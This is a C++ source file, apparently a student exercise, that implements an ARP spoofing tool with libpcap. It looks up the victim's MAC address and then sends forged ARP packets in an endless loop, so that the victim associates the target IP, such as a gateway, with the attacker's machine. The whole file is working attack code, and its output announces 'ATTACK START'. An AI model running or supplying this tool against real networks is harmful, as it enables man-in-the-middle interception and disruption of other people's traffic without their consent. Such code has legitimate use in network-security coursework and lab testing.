#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

/* ARP reply packet length */
#define ARP_REPLY 60

/* Mac address string format length */
#define MAC_ADDR_FORMAT 18

/* Ip address string formath length */
#define IP_ADDR_FORMAT 16

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
};

/* Send arp packet */
bool send_arp_packet(pcap_t* handle, const char* smac, const char* sip, const char* tmac, const char* tip)
{
    EthArpPacket packet;

    if(tmac == NULL) packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    else packet.eth_.dmac_ = Mac(tmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    if(tmac == NULL) packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    else packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

// get my mac address(for linux)
bool get_my_mac(const std::string& if_name, char* mac_addr_buf){
    try{
        std::ifstream iface("/sys/class/net/" + if_name + "/address", std::ios_base::in);
        iface.getline(mac_addr_buf, MAC_ADDR_FORMAT);
        iface.close();
        return true;
    }
    catch(int errno){
        std::cerr << "Error: " << strerror(errno);
        return false;
    }
}

// get my ip address(for linux)
bool get_my_ip(const std::string& if_name, char* ip_addr_buf){
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, if_name.c_str(), IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        std::cout << "Error!" <<std::endl;
        return false;
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                  ip_addr_buf,sizeof(struct sockaddr));
    }
    return true;
}

// get victim's mac address
bool get_victim_mac(pcap_t* handle, const char* smac, const char* sip, char* tmac, const char* tip){
    send_arp_packet(handle, smac, sip, NULL, tip);
    struct pcap_pkthdr* header;
    const u_char* packet;
    while (true){
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }
        if(header->caplen == ARP_REPLY) break;
    }
    struct sniff_ethernet* ethernet_header = (struct sniff_ethernet*)packet;
    sprintf(tmac, "%02x:%02x:%02x:%02x:%02x:%02x",
            ethernet_header->ether_shost[0]
            ,ethernet_header->ether_shost[1]
            ,ethernet_header->ether_shost[2]
            ,ethernet_header->ether_shost[3]
            ,ethernet_header->ether_shost[4]
            ,ethernet_header->ether_shost[5]
            );
    return true;
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* sender_ip = argv[2];
    char* target_ip = argv[3];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, ARP_REPLY, 1, 1, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    /* arp spoofing start */
    std::cout << "[*] ATTACK START" << std::endl;
    char mac_addr_buf[MAC_ADDR_FORMAT] = {0,};
    if(!get_my_mac(dev, mac_addr_buf)){ // get my mac address
        std::cout << "Error! can't get my mac!\n" << std::endl;
        return -1;
    }
    std::cout << "[*] My Mac Address : " << mac_addr_buf << std::endl;

    char ip_addr_buf[IP_ADDR_FORMAT] = {0,};
    if(!get_my_ip(dev, ip_addr_buf)){ // get my ip address
        std::cout << "Error! can't get my ip!" << std::endl;
        return -1;
    }
    std::cout << "[*] My IP Address : " << ip_addr_buf << std::endl;

    char vmac_addr_buf[MAC_ADDR_FORMAT] = {0,};
    if(!get_victim_mac(handle, mac_addr_buf, ip_addr_buf, vmac_addr_buf, sender_ip)) // get victim's mac address
    {
        std::cout << "Error! can't get victim's ip!" << std::endl;
        return -1;
    };
    std::cout << "[*] Victim's Mac Address : " << vmac_addr_buf << std::endl;

    while(true){
        std::cout << "[*] Send ARP packet for Spoofing ... " << std::endl;
        std::cout << "[*] press ctrl + c to stop ..." << std::endl;
        send_arp_packet(handle, mac_addr_buf, target_ip, vmac_addr_buf, sender_ip); // do arp spoofing
        sleep(0.5);
    }

    pcap_close(handle);
}
